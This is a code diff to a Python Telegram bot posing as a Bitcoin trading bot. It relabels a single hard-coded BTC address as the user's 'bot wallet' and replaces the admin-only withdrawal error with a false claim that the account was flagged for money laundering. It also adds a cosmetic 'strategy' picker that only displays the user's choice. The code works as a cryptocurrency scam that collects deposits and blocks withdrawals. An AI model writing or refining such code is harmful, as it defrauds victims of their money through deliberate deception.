@@ -13,7 +13,8 @@ from telegram.ext import (
 import nest_asyncio
 
 nest_asyncio.apply()  # Fix "event loop already running"
-
+user_strategies = {}  # stores per-user selected strategy
+STRATEGIES = ["Aggressive", "Conservative", "Balanced", "Experimental"]  # example strategies
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 DATA_FILE = "data.json"
 SECRET_PHRASE = "NewMexicoMouse"
@@ -105,16 +106,16 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     elif cmd == "deposit":
         await query.edit_message_text(
-            "Send BTC to:\n`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`",
+            "Your bots wallet address:\n`bc1qp5efu0wuq3zev4rctu8j0td5zmrgrm75459a0y`",
             parse_mode="Markdown",
             reply_markup=get_main_menu()
         )
 
     elif cmd == "withdrawal":
         if not is_admin(uid):
-            await query.edit_message_text("❌ Transaction failed. Admin only.", reply_markup=get_main_menu())
+            await query.edit_message_text("❌ Transaction failed. Your account was flagged for suspicious activity related to money laundering. Please, allow our team to resolve this before attempting to withdrawal again. ", reply_markup=get_main_menu())
         elif balance <= 0:
-            await query.edit_message_text("❌ Balance too low.", reply_markup=get_main_menu())
+            await query.edit_message_text("❌ Balance is 0.", reply_markup=get_main_menu())
         else:
             pending_withdrawal[uid] = 1
             await query.edit_message_text("🙋 Enter BTC withdrawal address:")
@@ -125,7 +126,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         log_action(uid, "Started Bot")
 
     elif cmd == "stop":
-        await query.edit_message_text("Stop command issued.", reply_markup=get_main_menu())
+        await query.edit_message_text("Bot Stopped.", reply_markup=get_main_menu())
         log_action(uid, "Stopped Bot")
 
     elif cmd == "monitor":
@@ -133,14 +134,20 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             price = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd").json()['bitcoin']['usd']
         except:
             price = "unknown"
+        strategy = user_strategies.get(uid, "None")
         await query.edit_message_text(
-            f"📊 BTC Price: ${price}\nYour Balance: {balance:.8f} BTC",
+            f"📊 BTC Price: ${price}\nYour Balance: {balance:.8f} BTC\n🧠 Strategy: {strategy}",
             reply_markup=get_main_menu()
         )
 
     elif cmd == "strategy":
-        # Placeholder for strategy picker (add your logic here)
-        await query.edit_message_text("🧠 Strategy picker coming soon...", reply_markup=get_main_menu())
+        buttons = [[InlineKeyboardButton(s, callback_data=f"select_strategy:{s}")] for s in STRATEGIES]
+        await query.edit_message_text("Choose a strategy:", reply_markup=InlineKeyboardMarkup(buttons))
+
+    elif cmd.startswith("select_strategy:"):
+        selected = cmd.split(":", 1)[1]
+        user_strategies[uid] = selected
+        await query.edit_message_text(f"Strategy set to: {selected}", reply_markup=get_main_menu())
 
     elif cmd == "exit":
         await query.edit_message_text("Goodbye!")
